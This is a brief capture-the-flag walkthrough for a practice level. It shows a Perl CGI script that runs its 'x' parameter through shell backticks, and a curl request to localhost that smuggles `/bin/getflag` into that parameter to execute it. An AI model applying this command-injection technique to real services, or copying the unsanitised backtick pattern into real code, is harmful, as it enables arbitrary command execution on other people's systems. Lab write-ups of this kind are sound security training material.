@@ -1,0 +1,23 @@
+~$ ll
+-> [...]
+  -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
+  [...]
+~$ cat level04.pl
+-> #!/usr/bin/perl\
+   # localhost:4747
+   use CGI qw{param};
+   print "Content-type: text/html\n\n";
+   sub x {
+     $y = $_[0];
+     print `echo $y 2>&1`;
+   }
+   x(param("x"));
+
+It is Perl script connecting to localhost:4747 with parameter x
+Let's pass x=getflag 
+
+~$ ./level04.pl | curl http://localhost:4747?x="\`/bin/getflag\`"
+
+Password: getflag in script
+
+Voila!
